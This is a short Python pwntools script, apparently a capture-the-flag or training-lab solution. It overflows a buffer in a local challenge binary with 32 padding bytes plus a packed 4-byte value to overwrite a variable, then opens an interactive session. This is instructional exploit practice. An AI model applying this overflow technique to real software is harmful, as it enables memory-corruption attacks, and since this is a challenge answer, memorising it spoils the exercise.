"""Buffer overflow: overwrite variable with specific value via p32."""
from pwn import *
from pwn import p32, process

binary_path = "/challenge/binary-exploitation-var-control-w"
p = process(binary_path)
padding = b"A" * 32
# 4 bytes little endian
win_val = p32(0x5A71653B)
payload = padding + win_val

p.send(payload)

p.interactive()
